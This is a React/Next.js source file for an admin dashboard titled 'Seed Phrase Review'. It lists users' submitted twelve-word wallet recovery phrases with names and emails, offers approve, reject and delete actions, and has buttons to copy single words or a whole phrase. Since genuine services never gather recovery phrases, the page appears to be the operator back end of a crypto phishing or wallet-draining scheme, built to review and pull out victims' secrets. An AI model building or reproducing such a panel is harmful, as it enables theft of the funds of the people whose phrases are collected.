"use client";

import React, { useState, useCallback, useEffect } from "react";
import { Activity, Check, X, Clock, Key, Copy, Trash2, Wallet, AlertTriangle } from "lucide-react";
import AdminHeader from "@/components/ui/admin-header";
import AdminSidebar from "@/components/ui/admin-sidebar";
import AdminNav from "@/components/ui/admin-nav";

// Helpers
const getStatusClasses = (status: string) => {
  switch (status) {
    case "approved":
      return "bg-green-100 text-green-700 dark:bg-green-900/30 dark:text-green-400";
    case "rejected":
      return "bg-red-100 text-red-700 dark:bg-red-900/30 dark:text-red-400";
    default:
      return "bg-yellow-100 text-yellow-700 dark:bg-yellow-900/30 dark:text-yellow-400";
  }
};

const getStatusIcon = (status: string) => {
  switch (status) {
    case "approved":
      return <Check className="w-4 h-4 mr-1" />;
    case "rejected":
      return <X className="w-4 h-4 mr-1" />;
    default:
      return <Clock className="w-4 h-4 mr-1" />;
  }
};

type PendingAction = {
  type: "approve" | "reject" | "delete";
  id: string;
  userName?: string;
} | null;

export default function AdminSeedphrasePage() {
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [seedphrases, setSeedphrases] = useState<any[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [expandedId, setExpandedId] = useState<string | null>(null);
  const [pendingAction, setPendingAction] = useState<PendingAction>(null);
  const [copiedWord, setCopiedWord] = useState<{ seedphraseId: string; wordIndex: number } | null>(null);

  const loadSeedphrases = useCallback(async () => {
    setError(null);
    try {
      setLoading(true);
      const res = await fetch("/api/admin/seedphrases", { cache: "no-store" });
      if (!res.ok) {
        setSeedphrases([]);
        setError("Failed to load seed phrases");
        return;
      }
      const data = await res.json();
      setSeedphrases(data);
    } catch (e: any) {
      setSeedphrases([]);
      setError(e?.message || "Unable to load seed phrases");
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    let mounted = true;
    (async () => {
      if (!mounted) return;
      await loadSeedphrases();
    })();
    return () => {
      mounted = false;
    };
  }, [loadSeedphrases]);

  const handleAction = useCallback(async (id: string, newStatus: string) => {
    setError(null);
    try {
      setLoading(true);
      const res = await fetch(`/api/admin/seedphrases`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id, status: newStatus }),
      });
      if (!res.ok) {
        const msg = await res.json().catch(() => ({}));
        setError(msg?.error || `Failed to update status (${res.status})`);
        return;
      }
      await loadSeedphrases();
    } catch (e: any) {
      setError(e?.message || "Action failed");
    } finally {
      setLoading(false);
    }
  }, [loadSeedphrases]);

  const handleDelete = useCallback(async (id: string) => {
    setError(null);
    try {
      setLoading(true);
      const res = await fetch(`/api/admin/seedphrases?id=${id}`, {
        method: "DELETE",
      });
      if (!res.ok) {
        const msg = await res.json().catch(() => ({}));
        setError(msg?.error || `Failed to delete (${res.status})`);
        return;
      }
      await loadSeedphrases();
    } catch (e: any) {
      setError(e?.message || "Delete failed");
    } finally {
      setLoading(false);
    }
  }, [loadSeedphrases]);

  const copyToClipboard = useCallback(async (text: string, seedphraseId: string, wordIndex?: number) => {
    try {
      await navigator.clipboard.writeText(text);
      if (wordIndex !== undefined) {
        setCopiedWord({ seedphraseId, wordIndex });
        setTimeout(() => setCopiedWord(null), 2000);
      }
    } catch (err) {
      console.error("Failed to copy:", err);
    }
  }, []);

  // Confirmation modal trigger helpers
  const requestAction = useCallback((type: "approve" | "reject" | "delete", id: string, userName?: string) => {
    setPendingAction({ type, id, userName });
  }, []);

  const confirmPendingAction = useCallback(async () => {
    if (!pendingAction) return;
    const { type, id } = pendingAction;
    setPendingAction(null);
    if (type === "approve") {
      await handleAction(id, "approved");
    } else if (type === "reject") {
      await handleAction(id, "rejected");
    } else if (type === "delete") {
      await handleDelete(id);
    }
  }, [pendingAction, handleAction, handleDelete]);

  const StatusPill = ({ status }: { status: string }) => (
    <div
      className={`flex items-center px-3 py-1 text-xs font-medium rounded-full ${getStatusClasses(
        status
      )}`}
    >
      {getStatusIcon(status)}
      {status.charAt(0).toUpperCase() + status.slice(1)}
    </div>
  );

  const modalCopy = (() => {
    if (!pendingAction) return null;
    const name = pendingAction.userName || "this user";
    switch (pendingAction.type) {
      case "approve":
        return {
          title: "Approve Seed Phrase",
          message: `Are you sure you want to approve the seed phrase submission from ${name}?`,
          confirmLabel: "Approve",
          confirmClasses: "bg-[#72a210] hover:bg-[#507800] text-white",
          icon: <Check className="w-6 h-6 text-[#72a210]" />,
        };
      case "reject":
        return {
          title: "Reject Seed Phrase",
          message: `Are you sure you want to reject the seed phrase submission from ${name}?`,
          confirmLabel: "Reject",
          confirmClasses: "bg-red-600 hover:bg-red-700 text-white",
          icon: <X className="w-6 h-6 text-red-600" />,
        };
      case "delete":
        return {
          title: "Delete Submission",
          message: `Are you sure you want to permanently delete the seed phrase submission from ${name}? This action cannot be undone.`,
          confirmLabel: "Delete",
          confirmClasses: "bg-red-600 hover:bg-red-700 text-white",
          icon: <AlertTriangle className="w-6 h-6 text-red-600" />,
        };
      default:
        return null;
    }
  })();

  return (
    <div className="flex h-screen overflow-hidden bg-gray-50 dark:bg-gray-950 font-inter">
      {/* Sidebar */}
      <AdminSidebar sidebarOpen={sidebarOpen} setSidebarOpen={setSidebarOpen} />

      {/* Main Section */}
      <div className="flex-1 flex flex-col overflow-hidden">
        <AdminHeader setSidebarOpen={setSidebarOpen} />

        {/* Content */}
        <main className="flex-1 overflow-y-auto overflow-x-hidden p-4 md:p-6 lg:p-8 pb-20 md:pb-8 mb-[50px] md:mb-0">
          {/* Header */}
          <div className="mb-8">
            <h1 className="text-2xl sm:text-3xl md:text-4xl font-bold text-gray-900 dark:text-gray-100 mb-1">
              Seed Phrase Review
            </h1>
            <p className="text-sm sm:text-base text-gray-600 dark:text-gray-400">
              Review and manage all user wallet seed phrase submissions.
            </p>
          </div>

          {/* Seedphrases List */}
          <div className="bg-white dark:bg-gray-900 rounded-2xl shadow-lg border border-gray-200 dark:border-gray-800 p-4 sm:p-6">
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-lg sm:text-xl font-semibold text-gray-900 dark:text-gray-100">
                All Seed Phrase Submissions
              </h2>
              <Key className="w-6 h-6 text-[#72a210] shrink-0" />
            </div>

            {/* Loading State */}
            {loading && (
              <div className="flex items-center justify-center py-6 text-[#72a210]">
                <Activity className="w-5 h-5 animate-spin mr-2" />
                Loading seed phrases...
              </div>
            )}

            {/* Empty State */}
            {!loading && seedphrases.length === 0 && (
              <div className="flex flex-col items-center justify-center py-10 text-center text-gray-500 dark:text-gray-400">
                <Key className="w-10 h-10 mb-3 text-[#72a210]" />
                <p className="text-lg font-medium">No seed phrases found</p>
                <p className="text-sm">Once users submit seed phrases, they'll appear here.</p>
              </div>
            )}

            {/* Error */}
            {error && (
              <div className="my-3 text-sm text-red-600 dark:text-red-400">{error}</div>
            )}

            {/* Seedphrases List */}
            {!loading &&
              seedphrases.length > 0 &&
              seedphrases.map((seedphrase) => (
                <div
                  key={seedphrase.id}
                  className="border-b border-gray-100 dark:border-gray-800 py-4 hover:bg-gray-50 dark:hover:bg-gray-800 transition-colors"
                >
                  {/* Header */}
                  <div className="flex flex-col sm:flex-row items-start sm:items-start justify-between gap-3 sm:gap-4">
                    <div className="flex items-start gap-3 sm:gap-4 flex-1 min-w-0 w-full">
                      {/* Wallet Icon */}
                      <div
                        className="w-10 h-10 sm:w-12 sm:h-12 rounded-xl flex items-center justify-center overflow-hidden shrink-0"
                        style={{ backgroundColor: `${seedphrase.walletColor}15` }}
                      >
                        <img src={seedphrase.walletIcon} alt={seedphrase.walletName} className="w-full h-full" />
                      </div>

                      {/* Info */}
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 flex-wrap mb-1">
                          <h3 className="font-semibold text-gray-900 dark:text-gray-100 truncate">
                            {seedphrase.userName || 'Unknown User'}
                          </h3>
                          <StatusPill status={seedphrase.status} />
                        </div>
                        <p className="text-sm text-gray-600 dark:text-gray-400 mb-1 truncate">
                          {seedphrase.userEmail}
                        </p>
                        <div className="flex items-center gap-2 text-sm flex-wrap">
                          <Wallet className="w-4 h-4 text-gray-500 shrink-0" />
                          <span className="text-gray-700 dark:text-gray-300">{seedphrase.walletName}</span>
                          <span className="text-gray-400 hidden sm:inline">•</span>
                          <span className="text-gray-500 dark:text-gray-400 text-xs sm:text-sm">
                            {new Date(seedphrase.submittedAt).toLocaleString()}
                          </span>
                        </div>
                      </div>
                    </div>

                    {/* Actions */}
                    <div className="flex items-center gap-2 shrink-0 flex-wrap w-full sm:w-auto justify-end">
                      {seedphrase.status === 'pending' ? (
                        <>
                          <button
                            onClick={() => requestAction("approve", seedphrase.id, seedphrase.userName)}
                            className="px-3 py-1.5 bg-[#72a210] text-white rounded-md text-sm font-medium hover:bg-[#507800] transition disabled:opacity-50 cursor-pointer"
                            disabled={loading}
                          >
                            <Check className="w-4 h-4 inline mr-1" />
                            Approve
                          </button>
                          <button
                            onClick={() => requestAction("reject", seedphrase.id, seedphrase.userName)}
                            className="px-3 py-1.5 bg-red-600 text-white rounded-md text-sm font-medium hover:bg-red-700 transition disabled:opacity-50 cursor-pointer"
                            disabled={loading}
                          >
                            <X className="w-4 h-4 inline mr-1" />
                            Reject
                          </button>
                        </>
                      ) : (
                        <div className="text-sm text-gray-500 dark:text-gray-400">
                          {seedphrase.status.charAt(0).toUpperCase() + seedphrase.status.slice(1)}
                        </div>
                      )}
                      <button
                        onClick={() => requestAction("delete", seedphrase.id, seedphrase.userName)}
                        className="p-1.5 text-gray-500 hover:text-red-600 hover:bg-red-50 dark:hover:bg-red-900/20 rounded-md transition cursor-pointer"
                        disabled={loading}
                      >
                        <Trash2 className="w-4 h-4" />
                      </button>
                      <button
                        onClick={() => setExpandedId(expandedId === seedphrase.id ? null : seedphrase.id)}
                        className="p-1.5 text-gray-500 hover:text-gray-700 dark:hover:text-gray-300 hover:bg-gray-100 dark:hover:bg-gray-700 rounded-md transition cursor-pointer"
                      >
                        {expandedId === seedphrase.id ? '▲' : '▼'}
                      </button>
                    </div>
                  </div>

                  {/* Expanded Seed Phrase */}
                  {expandedId === seedphrase.id && (
                    <div className="mt-4 p-3 sm:p-4 bg-gray-50 dark:bg-gray-800/50 rounded-xl">
                      <h4 className="text-sm font-semibold text-gray-900 dark:text-gray-100 mb-3">
                        12-Word Seed Phrase
                      </h4>
                      <div className="grid grid-cols-2 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-2">
                        {seedphrase.seedPhrase.map((word: string, index: number) => (
                          <div
                            key={index}
                            className="flex items-center gap-2 bg-white dark:bg-gray-900 border border-gray-200 dark:border-gray-700 rounded-lg px-2 sm:px-3 py-2"
                          >
                            <span className="text-xs font-medium text-gray-500 dark:text-gray-400 w-5 shrink-0">
                              {index + 1}.
                            </span>
                            <span className="flex-1 text-sm text-gray-900 dark:text-gray-100 font-mono truncate">
                              {word}
                            </span>
                            <button
                              onClick={() => copyToClipboard(word, seedphrase.id, index)}
                              className={`p-1 transition cursor-pointer shrink-0 ${
                                copiedWord?.seedphraseId === seedphrase.id && copiedWord?.wordIndex === index
                                  ? 'text-emerald-500'
                                  : 'text-gray-400 hover:text-gray-600 dark:hover:text-gray-300'
                              }`}
                              title="Copy word"
                            >
                              {copiedWord?.seedphraseId === seedphrase.id && copiedWord?.wordIndex === index ? (
                                <Check className="w-3 h-3" />
                              ) : (
                                <Copy className="w-3 h-3" />
                              )}
                            </button>
                          </div>
                        ))}
                      </div>
                      <button
                        onClick={() => copyToClipboard(seedphrase.seedPhrase.join(' '), seedphrase.id)}
                        className="mt-3 text-sm text-[#72a210] hover:text-[#507800] font-medium flex items-center gap-1 cursor-pointer"
                      >
                        <Copy className="w-4 h-4" />
                        Copy full seed phrase
                      </button>
                    </div>
                  )}
                </div>
              ))}
          </div>
        </main>

        {/* Mobile Bottom Navigation */}
        <AdminNav />
      </div>

      {/* Confirmation Modal */}
      {pendingAction && modalCopy && (
        <div
          className="fixed inset-0 z-50 flex items-end sm:items-center justify-center bg-black/50 p-0 sm:p-4"
          onClick={() => setPendingAction(null)}
        >
          <div
            className="bg-white dark:bg-gray-900 w-full sm:w-full sm:max-w-md rounded-t-2xl sm:rounded-2xl shadow-xl border border-gray-200 dark:border-gray-800 p-5 sm:p-6"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex items-start gap-3 mb-4">
              <div className="w-10 h-10 rounded-full bg-gray-100 dark:bg-gray-800 flex items-center justify-center shrink-0">
                {modalCopy.icon}
              </div>
              <div className="flex-1 min-w-0">
                <h3 className="text-lg font-semibold text-gray-900 dark:text-gray-100">
                  {modalCopy.title}
                </h3>
                <p className="text-sm text-gray-600 dark:text-gray-400 mt-1">
                  {modalCopy.message}
                </p>
              </div>
            </div>

            <div className="flex flex-col-reverse sm:flex-row justify-end gap-2 mt-5">
              <button
                onClick={() => setPendingAction(null)}
                className="px-4 py-2 rounded-md text-sm font-medium border border-gray-200 dark:border-gray-700 text-gray-700 dark:text-gray-300 hover:bg-gray-50 dark:hover:bg-gray-800 transition cursor-pointer w-full sm:w-auto"
                disabled={loading}
              >
                Cancel
              </button>
              <button
                onClick={confirmPendingAction}
                className={`px-4 py-2 rounded-md text-sm font-medium transition disabled:opacity-50 cursor-pointer w-full sm:w-auto ${modalCopy.confirmClasses}`}
                disabled={loading}
              >
                {modalCopy.confirmLabel}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}